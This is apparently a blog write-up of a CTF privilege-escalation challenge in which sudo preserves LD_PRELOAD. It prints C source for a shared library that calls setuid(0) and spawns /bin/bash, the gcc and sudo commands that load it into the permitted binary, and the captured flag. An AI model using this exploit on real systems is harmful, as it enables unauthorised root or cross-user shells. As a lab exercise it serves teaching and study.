---
title: "Writeup Cyber Threat Force : PrivEsc"
date: 2021-07-08T04:10:09+01:00
draft: false
tags: ["blog", "security", "ctf", "cyber-threat-force", "pwn"]
type: "posts"
showDate: true
---

For this challenge, we were given SSH access to a machine, as the user `ctf`. After running `sudo -l`, we quickly find that we can run the `/opt/Ivazov` binary as `ctf_cracked`. The user in question has a `flag.txt` file in their home, which only they can read.

We also notice `env_keep += LD_PRELOAD`. From there, we can try an [LD_PRELOAD exploit](https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld_preload). The steps taken here are copied from the guide was was just linked.

We save this code in `/tmp/pe.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

We compile and run it:
```bash
$ cd /tmp
$ # write the code to pe.c
$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
$ sudo -u ctf_cracked LD_PRELOAD=pe.so /opt/Ivazov
$ # shell as ctf_cracked
```

And we can now cat `/home/ctf_cracked/flag.txt`: `CYBERTF{LD_PRELOAD_2_Bypass_Ivazov}`.

You can [read other writeups](/blog/cyber-threat-force-ctf/).
